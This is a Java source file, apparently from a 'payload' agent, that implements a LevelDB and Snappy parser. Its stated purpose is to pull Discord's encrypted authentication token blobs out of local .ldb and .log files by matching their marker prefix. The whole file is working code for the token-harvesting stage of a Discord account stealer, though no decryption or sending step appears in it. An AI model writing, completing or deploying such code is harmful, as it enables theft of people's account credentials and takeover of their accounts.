package com.spcagentpayloa.jvmxx;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Minimal LevelDB reader: enough to recover Discord's encrypted token blobs
 * from .ldb blocks (raw Snappy) and .log records. It does not build a usable DB.
 */
public final class LevelDb {
	private static final Pattern APP_TOKEN =
		Pattern.compile("dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,})");
	private static final int BLOCK = 32 * 1024;
	private static final int LOG_HEADER = 7;

	private LevelDb() {
	}

	public static List<String> tokenBlobs(Path file) throws Exception {
		List<String> blobs = new ArrayList<>();
		for (String text : values(file)) {
			Matcher matcher = APP_TOKEN.matcher(text);
			while (matcher.find()) {
				blobs.add(matcher.group(1));
			}
		}
		return blobs;
	}

	public static List<String> values(Path file) throws Exception {
		byte[] data;
		try (InputStream input = Files.newInputStream(file)) {
			data = input.readNBytes(16 * 1024 * 1024);
		}
		String name = file.getFileName().toString().toLowerCase();
		return name.endsWith(".log") ? logValues(data) : tableValues(data);
	}

	/** Reassembles fragmented write-ahead-log records and returns their values. */
	private static List<String> logValues(byte[] data) {
		List<String> out = new ArrayList<>();
		ByteArrayOutputStream pending = new ByteArrayOutputStream();
		int pos = 0;
		while (pos + LOG_HEADER <= data.length) {
			if (pos % BLOCK > BLOCK - LOG_HEADER) {
				pos += BLOCK - (pos % BLOCK);
				continue;
			}
			int length = (data[pos + 4] & 0xff) | ((data[pos + 5] & 0xff) << 8);
			int type = data[pos + 6] & 0xff;
			if (length == 0 && type == 0) {
				pos += BLOCK - (pos % BLOCK);
				pending.reset();
				continue;
			}
			int start = pos + LOG_HEADER;
			int end = start + length;
			if (end > data.length) {
				break;
			}
			switch (type) {
				case 1 -> out.add(new String(data, start, length, StandardCharsets.ISO_8859_1));
				case 2 -> {
					pending.reset();
					pending.write(data, start, length);
				}
				case 3 -> pending.write(data, start, length);
				case 4 -> {
					pending.write(data, start, length);
					out.add(pending.toString(StandardCharsets.ISO_8859_1));
					pending.reset();
				}
				default -> {
				}
			}
			pos = end;
		}
		return out;
	}

	/** Walks SSTable data blocks, decompressing Snappy payloads. */
	private static List<String> tableValues(byte[] data) {
		List<String> out = new ArrayList<>();
		int pos = 0;
		while (pos + 8 <= data.length) {
			int length = (data[pos + 4] & 0xff) | ((data[pos + 5] & 0xff) << 8)
				| ((data[pos + 6] & 0xff) << 16) | ((data[pos + 7] & 0xff) << 24);
			if (length < 5 || pos + 8L + length > data.length) {
				break;
			}
			int start = pos + 8;
			int compression = data[start + length - 5] & 0xff;
			byte[] payload;
			try {
				payload = compression == 1
					? snappy(java.util.Arrays.copyOfRange(data, start, start + length - 5))
					: java.util.Arrays.copyOfRange(data, start, start + length - 5);
			} catch (Throwable throwable) {
				pos = start + length;
				continue;
			}
			out.add(new String(payload, StandardCharsets.ISO_8859_1));
			entryValues(payload, out);
			pos = start + length;
		}
		return out;
	}

	private static void entryValues(byte[] block, List<String> out) {
		int pos = 0;
		int limit = block.length - 4;
		while (pos < limit) {
			int[] cursor = { pos };
			int shared = varint(block, cursor);
			int nonShared = varint(block, cursor);
			int valueLength = varint(block, cursor);
			if (shared < 0 || nonShared < 0 || valueLength < 0) {
				return;
			}
			pos = cursor[0] + nonShared;
			if (pos + valueLength > block.length) {
				return;
			}
			out.add(new String(block, pos, valueLength, StandardCharsets.ISO_8859_1));
			pos += valueLength;
		}
	}

	private static int varint(byte[] data, int[] cursor) {
		int value = 0;
		int shift = 0;
		while (cursor[0] < data.length && shift < 32) {
			int current = data[cursor[0]++] & 0xff;
			value |= (current & 0x7f) << shift;
			if ((current & 0x80) == 0) {
				return value;
			}
			shift += 7;
		}
		return -1;
	}

	/** Raw Snappy block decoder (the only codec LevelDB uses). */
	public static byte[] snappy(byte[] input) {
		int[] cursor = { 0 };
		int length = varint(input, cursor);
		if (length < 0) {
			throw new IllegalArgumentException("snappy length");
		}
		byte[] out = new byte[length];
		int written = 0;
		while (cursor[0] < input.length && written < length) {
			int tag = input[cursor[0]++] & 0xff;
			int kind = tag & 3;
			if (kind == 0) {
				int size = tag >>> 2;
				if (size < 60) {
					size++;
				} else {
					int bytes = size - 59;
					size = 0;
					for (int index = 0; index < bytes; index++) {
						size |= (input[cursor[0]++] & 0xff) << (8 * index);
					}
					size++;
				}
				System.arraycopy(input, cursor[0], out, written, size);
				cursor[0] += size;
				written += size;
				continue;
			}
			int size;
			int offset;
			if (kind == 1) {
				size = 4 + ((tag >>> 2) & 7);
				offset = ((tag & 0xe0) << 3) | (input[cursor[0]++] & 0xff);
			} else if (kind == 2) {
				size = 1 + (tag >>> 2);
				offset = (input[cursor[0]] & 0xff) | ((input[cursor[0] + 1] & 0xff) << 8);
				cursor[0] += 2;
			} else {
				size = 1 + (tag >>> 2);
				offset = (input[cursor[0]] & 0xff) | ((input[cursor[0] + 1] & 0xff) << 8)
					| ((input[cursor[0] + 2] & 0xff) << 16) | ((input[cursor[0] + 3] & 0xff) << 24);
				cursor[0] += 4;
			}
			if (offset <= 0 || offset > written) {
				throw new IllegalArgumentException("snappy offset");
			}
			int from = written - offset;
			for (int index = 0; index < size; index++) {
				out[written++] = out[from + index];
			}
		}
		if (written != length) {
			throw new IllegalArgumentException("snappy short");
		}
		return out;
	}
}
